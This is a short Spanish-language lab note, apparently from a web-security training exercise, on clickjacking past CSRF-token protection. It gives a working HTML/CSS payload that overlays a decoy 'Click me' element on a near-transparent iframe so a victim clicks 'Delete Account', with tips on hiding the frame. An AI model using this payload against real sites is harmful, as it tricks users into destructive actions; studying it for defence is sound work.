# Clickjacking básico con token CSRF 

Tags: #Clickjacking 

```bash 
Este lab muestra cómo realizar un ataque de clickjacking incluso cuando la acción sensible está protegida por un token CSRF. Se aprovecha la falta de encabezados de protección como 'X-Frame-Options' para incrustar la página vulnerable dentro de un iframe en un sitio externo.


- Clickjacking: Es una técnica maliciosa para engañar a usuarios de internet con el fin de que revelen información confidencial o tomar el control de su ordenador cuando hacen clic en páginas web aparentemente inocentes.

Notas:
	1. Este lab solo funciona con Edge 
```

```html 
# El objetivo es borrar la cuenta al hacer click en 'Delete Account' que es un botón que ya esta en la misma web 

<style>
iframe{
width: 500px;
height: 600px;
opacity: 0.001;       
}

div{
position: relative;
top: 500px;
left: 40px;
}
</style>

<div>Click me</div>
<iframe src="https://web.com/my-account"></iframe>


Notas:
	1. Se puede colocar 'relative o absolute' en la posición 
	2. Se puede variar la opacidad para que no se vea la web 
```


